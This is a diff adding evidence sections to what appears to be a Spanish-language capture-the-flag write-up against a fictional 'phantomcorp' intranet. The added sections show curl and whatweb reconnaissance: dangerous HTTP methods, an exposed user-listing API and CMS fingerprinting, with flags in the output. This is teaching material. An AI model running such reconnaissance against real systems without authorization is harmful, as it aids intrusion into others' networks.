@@ -106,3 +106,59 @@ root@attacker:/loot# curl -s http://phantomcorp/.git/config
 
 
 
+### 2.3 - Evidencia: métodos HTTP peligrosos
+```console
+root@attacker:/loot# curl -X OPTIONS -i http://phantomcorp/
+HTTP/1.0 200 OK
+Server: PhantomServer/3.7 
+Date: Fri, 11 Sep 2026 23:30:01 GMT
+Allow: GET, POST, PUT, DELETE, OPTIONS
+X-Dangerous-Methods: FLAG{http_methods_put_enabled}
+```
+
+
+### 2.4 - Evidencia: API de usuarios expuesta
+```text
+root@attacker:/loot# curl -s http://phantomcorp/api/users | python3 -m json.tool
+```
+```json
+{
+    "users": [
+        {
+            "id": 1,
+            "user": "admin",
+            "role": "superuser"
+        },
+        {
+            "id": 2,
+            "user": "jperez",
+            "role": "editor"
+        },
+        {
+            "id": 3,
+            "user": "mgomez",
+            "role": "viewer"
+        }
+    ],
+    "note": "endpoint interno de RRHH - no exponer",
+    "flag": "FLAG{user_enumeration_api}"
+}
+```
+
+
+
+### 2.5 - Evidencia: fingerprinting de tecnología
+```console
+root@attacker:/loot# whatweb http://phantomcorp  
+http://phantomcorp [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[PhantomServer/3.7], IP[172.19.0.2], MetaGenerator[PhantomCMS 3.7], Title[Intranet PhantomCorp], X-Powered-By[PhantomCMS/3.7]
+```
+
+```console
+root@attacker:/loot# curl -s http://phantomcorp/phantomcms/VERSION  
+PhantomCMS 3.7 (build 2024-11)  
+Archivo default del CMS. Si llegaste aca por fingerprinting, bien.  
+FLAG{tech_fingerprint_phantomcms}  
+```
+
+
+
